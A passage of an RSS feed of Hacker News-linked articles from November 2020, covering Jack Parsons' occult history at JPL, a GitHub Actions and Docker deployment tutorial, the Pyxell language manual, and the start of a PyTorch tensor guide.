Egyptian deities, sex rituals, and a range of Eastern and Western mysticism. Eventually, Parsons was forced to choose between his new religious craze or pursuing his degree at USC. Ultimately, Parsons dropped out of school and chose to dedicate himself to Thelema, becoming a member of the local California chapter: the Ordo Templis Orientis. </span></p></div><div><p><span>Parsons’ own religious and scientific pursuits have proven screen worthy. His life has recently been adapted in the CBS All Access series, </span><em>Strange Angel</em><span>, based on the biography </span><em>Strange Angel: The Otherworldly Life of Rocket Scientist John Whiteside Parsons </em><span>by George Pendle. Supercluster sat down with Pendle and show creator, producer, and writer Mark Heyman for exclusive interviews about the life of this rocket-scientist-genius-occultist-playboy.</span></p></div><div><p><span>“I first came across a mention of him in reading that book </span><em>Going Clear</em><span>, which you know is about L. Ron Hubbard and Scientology. It was a fascinating moment in that book, and I sort of just filed it away,” says Heyman. The occult is no real shock to one of the minds behind Academy Award-nominated </span><em>Black Swan</em><span>. “I grew up in Santa Fe, New Mexico, and my parents were involved in a sort of new-age religion that some people would call a cult. I always felt like it was more cult-ish, but it wasn’t like a full-blown cult. So I’d always been interested in those sorts of organizations and groups, which is why I was reading “Going Clear” in the first place. A year or two after that, I was sent the book for </span><em>Strange Angel</em><span> by a producer. It was my first real deep dive into who Jack Parsons was and my first introduction to him, and it blew my mind on multiple levels.”</span></p></div><div><p><span>“We tend to think of the 30s and 40s as a more buttoned-down time, a more conservative time, but they were as wild and crazy as anything that happened in the 60s and 70s. And then, there was this sort of intersection of that with the sciences, and the birth of this new fangled science—rocket science. Which, back then, was not taken seriously at all and was considered just as fringe and out there as some of [Parsons’] religious preferences.”</span></p></div><div><p><span>Pendle had this to say about the era, “Because [Jack’s] personal life and personal interests were so at odds to the time he lived in, his scientific work—which was so groundbreaking—was kind of swept under the carpet… A lot of people who are very interesting are forgotten by history because they don’t fit into the pigeon holes we view history through. I often think you can get a better view of history from the edges rather than from the middle.”</span></p></div><div><p><span>Parsons without a doubt existed on the fringes. When the GALCIT Group first formed, aerospace engineering hadn’t even been invented yet. The first definition of the phrase would crop up in 1958, more than 20 years after GALCIT Group’s experiments started, and 6 years after Parsons’ death.</span></p></div><div><p><span>“Now, rocket science is sort of synonymous with the most esoteric of sciences. We have that expression, ‘It’s not rocket science.’ It’s implied that it’s meant to be the stuff of really, really educated experts,” says Heyman, “Whereas, back then, it was almost the opposite where it was the stuff of science fiction. It existed in popular culture, but in the way that dragons and time travel existed. It was actually the stuff of entertainment. So, it wasn’t taken seriously not because it was too complicated or too difficult. It wasn’t taken seriously because it was seen as imaginary.”</span></p></div><div><p><span>A figure like Parsons might seem to presage later eccentric innovators like Elon Musk or Steve Jobs. For Pendle, the parallel isn’t totally accurate. “Imagine like a Musk without a fortune, without people backing him, basically plucking spare parts from the garbage to build his electric cars. That’s the kind of thing you’d be looking at if you wanted to make them equal."</span></p></div><div><p><span>The scientific community took notice of Jack’s rag-tag methods in 1938 when his group successfully tested a static motor rocket that could run for over a minute. With funding from the federal government (and at the request of their CalTech peers), the Group relocated to …</span></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.supercluster.com/editorial/the-occult-history-behind-nasas-jet-propulsion-laboratory/">https://www.supercluster.com/editorial/the-occult-history-behind-nasas-jet-propulsion-laboratory/</a></em></p>]]>
            </description>
            <link>https://www.supercluster.com/editorial/the-occult-history-behind-nasas-jet-propulsion-laboratory/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066293</guid>
            <pubDate>Thu, 12 Nov 2020 04:01:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Speed reading with command-line utilty shirah-reader]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066170">thread link</a>) | @ThorBhai
<br/>
November 11, 2020 | https://diode.zone/videos/watch/0065aec7-de6c-48a4-b075-fb6d8a9096c8 | <a href="https://web.archive.org/web/*/https://diode.zone/videos/watch/0065aec7-de6c-48a4-b075-fb6d8a9096c8">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://diode.zone/videos/watch/0065aec7-de6c-48a4-b075-fb6d8a9096c8</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066170</guid>
            <pubDate>Thu, 12 Nov 2020 03:42:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Custom GitHub Actions with Docker]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066079">thread link</a>) | @sethetter
<br/>
November 11, 2020 | https://sethetter.com/posts/github-actions-with-docker/ | <a href="https://web.archive.org/web/*/https://sethetter.com/posts/github-actions-with-docker/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <section>
        <p>I finally decided to dip my toes into GitHub actions recently, for a relatively simple task: build and deploy my personal site. The site is built with <a href="https://getzola.org/">zola</a> and deployed to <a href="https://netlify.com/">netlify</a>.</p>
<p>My needs are pretty straightforward.</p>
<ul>
<li>The zola binary</li>
<li>Node, and <a href="https://www.npmjs.com/package/netlify-cli">netlify-cli</a> installed</li>
<li>Secure way to provide netlify config</li>
</ul>
<p>Then I simply make sure my site source is checked out and run the <code>build</code> and <code>deploy</code> commands.</p>
<h2 id="some-terminology">Some terminology</h2>
<p>An <a href="https://docs.github.com/en/free-pro-team@latest/actions/creating-actions/about-actions"><strong>action</strong></a> is a single step that may be performed in a larger <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/workflow-syntax-for-github-actions"><strong>workflow</strong></a>, which strings together multiple actions and is kicked off in response to various events (like a <code>git push</code>, or a PR). You can have a workflow that calls a single action, but an action can't be used without being called in a workflow.</p>
<h2 id="first-impression-with-actions">First impression with Actions</h2>
<p>I noticed the marketplace approach first of all, and the emphasis on actions that did one small thing which you compose together. This can definitely be a nice approach to things, but my preferred way of working on CI tasks like this is to have access to a Docker container where I have a bit more control of my environment, and can codify it into a familiar Dockerfile.</p>
<p>My thinking is, if I can get this sort of approach to work, I'll have less required domain knowledge of GitHub actions, and can instead just lean on my Docker knowledge to set up whatever operations I may need.</p>
<p>Needless to say, I simply sidestepped the marketplace and found the <a href="https://docs.github.com/en/free-pro-team@latest/actions/creating-actions/creating-a-docker-container-action">documentation for utilizing Docker</a>, which thankfully is a valid option! 🎉</p>
<h2 id="my-setup">My setup</h2>
<p>I stumbled through this quite a bit, but ultimately am happy with the approach. I'm able to have a <code>Dockerfile</code> and custom <a href="https://docs.docker.com/engine/reference/builder/#entrypoint"><code>entrypoint.sh</code></a> file that can receive inputs via env vars from the action configuration. I'm also able to pipe secrets, stored in my GitHub repo, into the action from the workflow file.</p>
<h3 id="the-action-file"><a href="https://github.com/sethetter/sethetter.com/blob/1e916825348e2ee2f401b5204811c18e394432e3/.github/actions/build-and-deploy/action.yml">The action file</a></h3>
<pre><code><span># .github/actions/build-and-deploy/action.yml
</span><span>name</span><span>: </span><span>'</span><span>Build and deploy</span><span>'
</span><span>description</span><span>: </span><span>'</span><span>Build site with Zola and deploy to Netlify</span><span>'
</span><span>inputs</span><span>:
  </span><span>auth_token</span><span>:
    </span><span>description</span><span>: </span><span>'</span><span>Netlify auth token</span><span>'
    </span><span>required</span><span>: </span><span>true
  </span><span>site_id</span><span>:
    </span><span>description</span><span>: </span><span>'</span><span>Netlify site ID to deploy to</span><span>'
    </span><span>required</span><span>: </span><span>true
  </span><span>deploy_dir</span><span>:
    </span><span>description</span><span>: </span><span>'</span><span>Directory to deploy to netlify</span><span>'
    </span><span>required</span><span>: </span><span>true
  </span><span>zola_version</span><span>:
    </span><span>description</span><span>: </span><span>'</span><span>Version of zola to pull</span><span>'
    </span><span>required</span><span>: </span><span>true
    </span><span>default</span><span>: </span><span>'</span><span>0.12.2</span><span>'
</span><span>runs</span><span>:
  </span><span>using</span><span>: </span><span>'</span><span>docker</span><span>'
  </span><span>image</span><span>: </span><span>'</span><span>Dockerfile</span><span>'
  </span><span>env</span><span>:
    </span><span>ZOLA_VERSION</span><span>: </span><span>${{ inputs.zola_version }}
    NETLIFY_AUTH_TOKEN</span><span>: </span><span>${{ inputs.auth_token }}
    NETLIFY_SITE_ID</span><span>: </span><span>${{ inputs.site_id }}
    NETLIFY_DEPLOY_DIR</span><span>: </span><span>${{ inputs.deploy_dir }}
</span></code></pre>
<p>This file defines our action, which will be called from a workflow which we will configure later. The main thing to notice here is how we are accepting inputs, and passing those on to our Docker container through environment variables.</p>
<p><strong>This was one of the things I stumbled over</strong>. Currently there is no support for passing <a href="https://docs.docker.com/engine/reference/commandline/build/#set-build-time-variables---build-arg">build args</a> to our Dockerfile, and the environment variables we provide are not available during the build stage, only once the <a href="https://docs.docker.com/engine/reference/builder/#entrypoint"><code>ENTRYPOINT</code></a> is called.</p>
<p>I was stuck on this for a decent chunk of time before realizing that <a href="https://docs.github.com/en/free-pro-team@latest/actions/creating-actions/metadata-syntax-for-github-actions#runsargs"><code>runs.args</code> with <code>docker</code> are <em>not</em> build args</a>, they are arguments sent to the <code>entrypoint</code>. Don't make the same mistakes I did!</p>
<p>The implication here is that any steps in your action that require one of these inputs must happen in the <code>ENTRYPOINT</code> provided via <code>env</code>. I'll mention this again shortly.</p>
<h3 id="docker-setup">Docker setup</h3>
<p>The <a href="https://github.com/sethetter/sethetter.com/blob/4fdf1675084628f6ddd3aaa31aaa05a1a118b1d6/.github/actions/build-and-deploy/Dockerfile">Dockerfile</a> is pretty minimal, simply setting up the base environment I want, which is <code>node:lts</code> in this case, and then copy in my custom <code>[entrypoint.sh](http://entrypoint.sh)</code> script.</p>
<pre><code><span># .github/actions/build-and-deploy/Dockerfile
</span><span>FROM node:lts
COPY entrypoint.sh /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
</span></code></pre>
<p><strong>Tip!</strong> <a href="https://docs.github.com/en/free-pro-team@latest/actions/creating-actions/dockerfile-support-for-github-actions#workdir">Don't set a <code>WORKDIR</code></a>. The action sets the workdir to the <code>$GITHUB_WORKSPACE</code> variable which is where your project source will be located.</p>
<p>All the action happens in the <a href="https://github.com/sethetter/sethetter.com/blob/1e916825348e2ee2f401b5204811c18e394432e3/.github/actions/build-and-deploy/entrypoint.sh"><code>entrypoint.sh</code></a> file.</p>
<pre><code><span># .github/actions/build-and-deploy/entrypoint.sh

#!/usr/bin/env bash
</span><span>ZOLA_URL=https://github.com/getzola/zola/releases/download/v${ZOLA_VERSION}/zola-v${ZOLA_VERSION}-x86_64-unknown-linux-gnu.tar.gz
curl -L $ZOLA_URL | tar xz -C /usr/local/bin

</span><span># Install netlify
</span><span>npm i -g netlify-cli

</span><span># Kick off build and deploy
</span><span>zola build
netlify deploy \
  --prod \
  --dir=$NETLIFY_DEPLOY_DIR \
 --auth=$NETLIFY_AUTH_TOKEN \
 --site=$NETLIFY_SITE_ID
</span></code></pre>
<p>You can see here we're referencing the <code>env</code> vars we defined in our action file. Originally I had the zola and netlify install steps happening in the <code>Dockerfile</code>, but due to the inability to pass build args to the image, I wasn't able to get the <code>$ZOLA_VERSION</code> passed in. Once I had that realization, it seemed just as viable to put everything in <code>entrypoint.sh</code>.</p>
<h3 id="the-workflow-file"><a href="https://github.com/sethetter/sethetter.com/blob/4fdf1675084628f6ddd3aaa31aaa05a1a118b1d6/.github/workflows/build-and-deploy.yml">The workflow file</a></h3>
<pre><code><span># .github/workflows/build-and-deploy.yml
</span><span>name</span><span>: </span><span>build-and-deploy
</span><span>on</span><span>:
  </span><span>push</span><span>:
    </span><span>branches</span><span>: [</span><span>master</span><span>]
</span><span>jobs</span><span>:
  </span><span>build-and-deploy</span><span>:
    </span><span>runs-on</span><span>: </span><span>ubuntu-latest
    steps</span><span>:
      - </span><span>uses</span><span>: </span><span>actions/checkout@v2
      </span><span>- </span><span>uses</span><span>: </span><span>./.github/actions/build-and-deploy
        with</span><span>:
          </span><span>zola_version</span><span>: </span><span>'</span><span>0.12.2</span><span>'
          </span><span>auth_token</span><span>: </span><span>${{ secrets.NETLIFY_AUTH_TOKEN }}
          site_id</span><span>: </span><span>${{ secrets.NETLIFY_SITE_ID }}
          deploy_dir</span><span>: </span><span>'</span><span>public</span><span>'
</span></code></pre>
<p>This is our final configuration file, turning our new custom action into a workflow. We start by setting our workflow triggers in the <code>on</code> block. In this case we just want to run this workflow on pushes to <code>master</code>.</p>
<p>Next is our <code>jobs</code> block. We can define multiple jobs which would all run in parallel. If we need anything serial, it should happen within a single job. In our case, we have just one job with two actions.</p>
<p>The job itself starts with the checkout action, which handles checking out the repo's source into the job workspace, then we call our custom action by providing a path to the action folder.</p>
<p>In our <code>with</code> block we provide values for the inputs we defined on our action. You'll notice that two of the values are provided via <code>secrets</code>, which is a <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/encrypted-secrets">feature of GitHub</a> I wasn't aware of before this. It's very easy to work with!</p>
<h2 id="room-for-improvement">Room for improvement</h2>
<p>I think the main drawback here is potentially slow job run times, since we're installing our dependencies each time. Depending on what's actually slow, there are a number of ways it could be addressed.</p>
<p>In general, finding a base Docker image that has as much of what you need as possible (without too much bloat) is going to help. Maintaining your own images in a registry somewhere comes with it's own overhead, but that's also an option.</p>
<p>I'm sure using the marketplace approach could also be a way to address the performance issues, assuming you find actions that have your dependencies installed and configured appropriately, but the goal of this post was to explore a minimal action configuration while leveraging the power of Docker 😄.</p>
<p><strong>That's it!</strong> 👋</p>

    </section>
</article></div>]]>
            </description>
            <link>https://sethetter.com/posts/github-actions-with-docker/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066079</guid>
            <pubDate>Thu, 12 Nov 2020 03:28:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pyxell – a programming language that combines Python's elegance with C++'s speed]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25066058">thread link</a>) | @masijo
<br/>
November 11, 2020 | https://www.pyxell.org/docs/manual.html | <a href="https://web.archive.org/web/*/https://www.pyxell.org/docs/manual.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>Pyxell [<em>pixel</em>] is a multi-paradigm, statically typed programming language, compiled to machine code via C++.</p> <p>This manual should let you quickly learn all the details to start programming in Pyxell.
It is assumed that you already know some programming language (preferably Python), since basic programming concepts are not explained here.</p> <p>You are encouraged to run the code snippets and experiment with them for yourself.
To run Pyxell code, go to the <a href="https://www.pyxell.org/docs/playground.html">Playground</a>,
clone the repository and follow the instructions on <a href="https://github.com/adamsol/Pyxell#requirements" target="_blank" rel="noopener noreferrer">Github<span> <span>(opens new window)</span></span></a>,
or download Windows binaries from the <a href="https://github.com/adamsol/Pyxell/releases" target="_blank" rel="noopener noreferrer">Releases<span> <span>(opens new window)</span></span></a>.</p> <h2 id="hello-world"><a href="#hello-world">#</a> Hello, world!</h2> <p>If you can run the following code and see the message on the screen, you are ready to start.</p> <h2 id="variables-and-types"><a href="#variables-and-types">#</a> Variables and types</h2> <h3 id="variable-declaration"><a href="#variable-declaration">#</a> Variable declaration</h3> <p>Pyxell is statically typed. Variables have types assigned during compilation.
In most cases, type of an expression is automatically inferred and the value can be directly assigned to a variable.</p> <p>In other cases, when the type cannot be inferred or you want to declare a variable without initializing it, you can set the type explicitly.
When not directly initialized, variable is automatically initialized with the default value for a given type.
You can find the list of all available types and their default values in the <a href="https://www.pyxell.org/docs/specification.html#types">Specification</a>.</p> <p>Variable name must start with a letter, but may also contain digits, underscores, and apostrophes.
Once a variable has been created, its type cannot be changed.</p> <h3 id="type-coercion"><a href="#type-coercion">#</a> Type coercion</h3> <p>Values of some types can be automatically converted to more general types: <code>Int -&gt; Rat -&gt; Float</code> or <code>Char -&gt; String</code>.</p> <p>The coercion doesn't work in the other direction.</p> <h2 id="arithmetic-and-logic"><a href="#arithmetic-and-logic">#</a> Arithmetic and logic</h2> <h3 id="numbers"><a href="#numbers">#</a> Numbers</h3> <p>Standard integers in Pyxell have 64 bits of precision and range from <code>-2^63</code> to <code>2^63-1</code>.
Binary, octal, and hexadecimal literals are supported.</p> <p>Rational numbers have unlimited precision.
They can be written either as integers with <code>r</code> suffix, or non-integers in decimal form.
They are also created as the result of division or exponentiation
(to obtain an integer from a division or exponentiation, use lossy <code>//</code> and <code>^^</code> operators).</p> <p>You can retrieve the numerator and denominator from a rational number.</p> <p>Floating-point numbers have 64 bits of precision and follow the IEEE 754 standard.
They can be written with <code>f</code> suffix or in scientific notation.</p> <p>Underscores can be additionally used in all numeric literals, to enhance readability of long numbers.</p> <h3 id="boolean-values"><a href="#boolean-values">#</a> Boolean values</h3> <p>There are two boolean values: <code>true</code> and <code>false</code>.
Logical negation and short-circuiting conjunction and disjunction operators are available.</p> <p>Boolean values are most often obtained in the result of comparisons.
When comparison operators are chained, they behave as if connected with <code>and</code> operator.</p> <h2 id="characters-and-strings"><a href="#characters-and-strings">#</a> Characters and strings</h2> <h3 id="characters"><a href="#characters">#</a> Characters</h3> <p>Characters are written in single quotes.</p> <p>You can get character's ASCII code, as well as obtain character corresponding to a given integer.</p> <p>You can also perform some arithmetic operations on characters.</p> <h3 id="strings"><a href="#strings">#</a> Strings</h3> <p>Strings are immutable sequences of characters. They are written in double quotes.</p> <p>You can access string's length, as well as its individual characters. Negative indexing and slicing is also supported, like in Python.</p> <p>Strings can be concatenated with <code>+</code> operator and repeated with <code>*</code> operator.</p> <p>You can construct formatted strings using interpolation syntax.</p> <h2 id="control-flow"><a href="#control-flow">#</a> Control flow</h2> <p>Pyxell uses indentation-based syntax, similar to Python's. Only spaces are allowed (tab character will cause a syntax error).
Rather than <code>:</code> character, Pyxell uses <code>do</code> keyword for indicating beginning of a block, and <code>def</code> keyword for function and class definitions.
The scope of a variable declared in a block is limited to that block.</p> <h3 id="if-statement"><a href="#if-statement">#</a> <code>if</code> statement</h3> <p>The first branch whose condition evaluates to <code>true</code> is executed.</p> <h3 id="while-loop"><a href="#while-loop">#</a> <code>while</code> loop</h3> <p>The loop runs while the condition is satisfied.</p> <h3 id="until-loop"><a href="#until-loop">#</a> <code>until</code> loop</h3> <p>This loop is similar to <code>while</code> loop, but it is always executed at least once and runs until the condition is satisfied.</p> <h3 id="for-loop"><a href="#for-loop">#</a> <code>for</code> loop</h3> <p>It can be used to loop over ranges (of numbers or characters) and other iterables.
Range can be inclusive (<code>a..b</code>), exclusive (<code>a...b</code>), or infinite (<code>a...</code>).</p> <p>You can optionally provide a step value, which can be either positive or negative (it is 1 by default).</p> <p>It is possible to loop over multiple iterables at once and provide custom step values to any of them.</p> <h3 id="continue-and-break"><a href="#continue-and-break">#</a> <code>continue</code> and <code>break</code></h3> <p>Inside loops you can use statements to exit the current iteration or the whole loop.</p> <h2 id="containers"><a href="#containers">#</a> Containers</h2> <h3 id="arrays"><a href="#arrays">#</a> Arrays</h3> <p>Arrays are similar to strings, but they are mutable and can have elements of any type.</p> <p>Containers have reference semantics, so they are not implicitly copied when variables are passed.
Mutation of one instance is reflected in all other instances of the same container.</p> <p>When an empty array is used, its type must be explicitly given.</p> <p>Arrays can be concatenated, repeated, and compared using standard operators.</p> <p>You can use array comprehension, as well as range literals and spread operator with optional step.</p> <p>For type safety, containers in Pyxell are invariant, which means they cannot be implicitly converted to another type,
even if types of the elements match (see <a href="https://stackoverflow.com/q/2745265" target="_blank" rel="noopener noreferrer">here<span> <span>(opens new window)</span></span></a> for a broader explanation).
However, container literals can be automatically converted.</p> <h3 id="sets"><a href="#sets">#</a> Sets</h3> <p>Sets contain no duplicates and do not preserve order of elements.</p> <p>Empty set can be created like an empty array.</p> <p>To check if an element is in the set, use <code>in</code> operator.</p> <p>There exist operators for set union, difference, and intersection.</p> <p>Like with arrays, you can use comprehensions, ranges, and spread syntax to create sets.</p> <p>Containers are not hashable, so they cannot be stored in sets.</p> <h3 id="dictionaries"><a href="#dictionaries">#</a> Dictionaries</h3> <p>Dictionaries are hash maps. Like sets, they do not preserve order of elements.
They work similarly to <code>defaultdict</code> in Python: if a key is not present, the default value for a given type is automatically created in the dictionary.</p> <p>Empty dictionary literal has an additional colon.</p> <p>Use <code>in</code> operator for checking if the dictionary contains a given key.</p> <p>Dictionaries can be merged with <code>+</code> operator. In the case of repeated keys, the second value wins.</p> <p>Dictionary comprehension works similarly to array and set comprehension.</p> <p>When iterated over, dictionaries produce pairs of key and value.</p> <p>Spread operator for dictionaries consists of an extra colon.</p> <h2 id="nullable-types"><a href="#nullable-types">#</a> Nullable types</h2> <p>To accept <code>null</code> value, variable's type must be explicitly marked as nullable.</p> <p>You can either directly check if a value is <code>null</code>, or use special coalescing and conditional operators.</p> <p>There is also an operator to directly retrieve the value, for cases when you are sure it is not null.</p> <h2 id="tuples"><a href="#tuples">#</a> Tuples</h2> <p>Two or more values separated with a comma (outside of a container, function call, and print statement) form a tuple.</p> <p>Values can be retrieved using alphabetical properties or tuple destructuring (unneeded part can be discarded with an underscore).</p> <p>Tuples are mutable, but they have value semantics, so they are hashable and can be passed around as if they were immutable.</p> <h2 id="functions"><a href="#functions">#</a> Functions</h2> <h3 id="function-definition-and-call"><a href="#function-definition-and-call">#</a> Function definition and call</h3> <p>Basic definition of a function consists of its name, list of arguments, return type, and body.</p> <p>When a function does not return anything, the return type may be written as <code>Void</code> or may be omitted completely.</p> <p>You can provide default values for optional arguments.
The expressions will be evaluated every time the function is called (if they are needed), so mutable container literals can be safely used.</p> <p>Arguments can be also passed in any order using their names.</p> <p>Variadic functions are supported too. This is just a syntactic sugar for passing an array.
Ranges and spread syntax can be used when such a function is called.</p> <p>Functions can be stored in variables, passed to other functions as arguments, etc.
However, when a function is converted to a variable, all information about its arguments except for their types is lost.</p> <h3 id="generic-functions"><a href="#generic-functions">#</a> Generic functions</h3> <p>Generic functions are standard functions with additional type variables, which can be used just like normal types.
They are compiled independently for each combination of types they are called with.</p> <p>Function declaration may contain default values for generic arguments, and the body may contain any code dependent on the real types.
Errors will be reported when the function cannot be compiled with given types.</p> <p>When a type name is used more than once, the compiler will try to unify types of the arguments, following the coercion rules.</p> <h3 id="lambda-functions"><a href="#lambda-functions">#</a> Lambda functions</h3> <p>Lambda is a simpler version of generic function, where all arguments, as well as the return type, are generic.</p> <p>You can use placeholder syntax to write even more concise functions. Each underscore corresponds to one argument.</p> <p>Placeholder resolving doesn't run through function calls by default (placeholders inside a function call form their own functions for corresponding arguments).
To create a partial function, add <code>@</code> character.</p> <p>Lambdas can also be multi-line, so that you can define normal functions without any type annotations.</p> <p>Note that lambda functions currently work only with arguments of known types.
You cannot pass a lambda function to another lambda function.
In the case of functional arguments, it's better to use the full generic definition instead.</p> <h3 id="generators"><a href="#generators">#</a> Generators</h3> <p>Generator is a function producing a sequence of values that can be iterated over without storing it in memory.
To create a generator, add an asterisk symbol to the function definition.</p> <p>Lambdas can be generators as well.</p> <p>Note that generators are currently supported only with Clang.</p> <h2 id="classes"><a href="#classes">#</a> Classes</h2> <h3 id="class-definition-and-object-construction"><a href="#class-definition-and-object-construction">#</a> Class definition and object construction</h3> <p>Definition of a class consists of its name and list of fields.
Each field may have an explicit default value; if not provided, it will be the default value for a given type.</p> <p>Every class has a default constructor function that accepts field values in the order of definition, or as named arguments.
Fields not directly initialized will receive their default values.</p> <p>Remember that class objects must always be explicitly constructed before use (they have no valid default …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.pyxell.org/docs/manual.html">https://www.pyxell.org/docs/manual.html</a></em></p>]]>
            </description>
            <link>https://www.pyxell.org/docs/manual.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066058</guid>
            <pubDate>Thu, 12 Nov 2020 03:25:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Complete Guide to PyTorch for Data Scientists]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065771">thread link</a>) | @shirappu
<br/>
November 11, 2020 | https://mlwhiz.com/blog/2020/09/09/pytorch_guide/ | <a href="https://web.archive.org/web/*/https://mlwhiz.com/blog/2020/09/09/pytorch_guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em><strong>PyTorch</strong></em> has sort of became one of the de facto standards for creating Neural Networks now, and I love its interface. Yet, it is somehow a little difficult for beginners to get a hold of.</p><p>I remember picking PyTorch up only after some extensive experimentation a couple of years back. To tell you the truth, it took me a lot of time to pick it up but am I glad that I moved from
<a href="https://towardsdatascience.com/moving-from-keras-to-pytorch-f0d4fff4ce79" target="_blank" rel="nofollow noopener">Keras to PyTorch</a>
. With its high customizability and pythonic syntax,PyTorch is just a joy to work with, and I would recommend it to anyone who wants to do some heavy lifting with Deep Learning.</p><p>So, in this PyTorch guide, <em><strong>I will try to ease some of the pain with PyTorch for starters</strong></em> and go through some of the most important classes and modules that you will require while creating any Neural Network with Pytorch.</p><p>But, that is not to say that this is aimed at beginners only as <em><strong>I will also talk about the</strong></em> <em><strong>high customizability PyTorch provides and will talk about custom Layers, Datasets, Dataloaders, and Loss functions</strong></em>.</p><p>So let’s get some coffee ☕ ️and start it up.</p><hr><h2 id="tensors">Tensors</h2><p>Tensors are the basic building blocks in PyTorch and put very simply, they are NumPy arrays but on GPU. In this part, I will list down some of the most used operations we can use while working with Tensors. This is by no means an exhaustive list of operations you can do with Tensors, but it is helpful to understand what tensors are before going towards the more exciting parts.</p><h3 id="1-create-a-tensor">1. Create a Tensor</h3><p>We can create a PyTorch tensor in multiple ways. This includes converting to tensor from a NumPy array. Below is just a small gist with some examples to start with, but you can do a whole lot of
<a href="https://pytorch.org/docs/stable/tensors.html" target="_blank" rel="nofollow noopener">more things</a>
with tensors just like you can do with NumPy arrays.</p><div><pre><code data-lang="py"><span># Using torch.Tensor</span>
t <span>=</span> torch<span>.</span>Tensor([[<span>1</span>,<span>2</span>,<span>3</span>],[<span>3</span>,<span>4</span>,<span>5</span>]])
<span>print</span>(f<span>"Created Tensor Using torch.Tensor:</span><span>\n</span><span>{t}"</span>)

<span># Using torch.randn</span>
t <span>=</span> torch<span>.</span>randn(<span>3</span>, <span>5</span>)
<span>print</span>(f<span>"Created Tensor Using torch.randn:</span><span>\n</span><span>{t}"</span>)

<span># using torch.[ones|zeros](*size)</span>
t <span>=</span> torch<span>.</span>ones(<span>3</span>, <span>5</span>)
<span>print</span>(f<span>"Created Tensor Using torch.ones:</span><span>\n</span><span>{t}"</span>)
t <span>=</span> torch<span>.</span>zeros(<span>3</span>, <span>5</span>)
<span>print</span>(f<span>"Created Tensor Using torch.zeros:</span><span>\n</span><span>{t}"</span>)

<span># using torch.randint - a tensor of size 4,5 with entries between 0 and 10(excluded)</span>
t <span>=</span> torch<span>.</span>randint(low <span>=</span> <span>0</span>,high <span>=</span> <span>10</span>,size <span>=</span> (<span>4</span>,<span>5</span>))
<span>print</span>(f<span>"Created Tensor Using torch.randint:</span><span>\n</span><span>{t}"</span>)

<span># Using from_numpy to convert from Numpy Array to Tensor</span>
a <span>=</span> np<span>.</span>array([[<span>1</span>,<span>2</span>,<span>3</span>],[<span>3</span>,<span>4</span>,<span>5</span>]])
t <span>=</span> torch<span>.</span>from_numpy(a)
<span>print</span>(f<span>"Convert to Tensor From Numpy Array:</span><span>\n</span><span>{t}"</span>)

<span># Using .numpy() to convert from Tensor to Numpy array</span>
t <span>=</span> t<span>.</span>numpy()
<span>print</span>(f<span>"Convert to Numpy Array From Tensor:</span><span>\n</span><span>{t}"</span>)
</code></pre></div><p><img sizes="(min-width: 35em) 1200px, 100vw" srcset="https://mlwhiz.com/images/pytorch_guide/0_hu498d9dc39892132ab99f755c5b75f03e_77051_500x0_resize_box_2.png 500w
, https://mlwhiz.com/images/pytorch_guide/0_hu498d9dc39892132ab99f755c5b75f03e_77051_800x0_resize_box_2.png 800w
, https://mlwhiz.com/images/pytorch_guide/0_hu498d9dc39892132ab99f755c5b75f03e_77051_1200x0_resize_box_2.png 1200w" src="https://mlwhiz.com/images/pytorch_guide/0.png" alt="MLWhiz: Data Science, Machine Learning, Artificial Intelligence"></p><h3 id="2-tensor-operations">2. Tensor Operations</h3><p>Again, there are a lot of operations you can do on these tensors. The full list of functions can be found
<a href="https://pytorch.org/docs/stable/torch.html?highlight=mm#math-operations" target="_blank" rel="nofollow noopener">here</a>
.</p><div><pre><code data-lang="py">A <span>=</span> torch<span>.</span>randn(<span>3</span>,<span>4</span>)
W <span>=</span> torch<span>.</span>randn(<span>4</span>,<span>2</span>)
<span># Multiply Matrix A and W</span>
t <span>=</span> A<span>.</span>mm(W)
<span>print</span>(f<span>"Created Tensor t by Multiplying A and W:</span><span>\n</span><span>{t}"</span>)
<span># Transpose Tensor t</span>
t <span>=</span> t<span>.</span>t()
<span>print</span>(f<span>"Transpose of Tensor t:</span><span>\n</span><span>{t}"</span>)
<span># Square each element of t</span>
t <span>=</span> t<span>**</span><span>2</span>
<span>print</span>(f<span>"Square each element of Tensor t:</span><span>\n</span><span>{t}"</span>)
<span># return the size of a tensor</span>
<span>print</span>(f<span>"Size of Tensor t using .size():</span><span>\n</span><span>{t.size()}"</span>)
</code></pre></div><p><img sizes="(min-width: 35em) 1200px, 100vw" srcset="https://mlwhiz.com/images/pytorch_guide/1_hufb8162ba4b3c0b49f946179a1702f5a7_45468_500x0_resize_box_2.png 500w
, https://mlwhiz.com/images/pytorch_guide/1_hufb8162ba4b3c0b49f946179a1702f5a7_45468_800x0_resize_box_2.png 800w
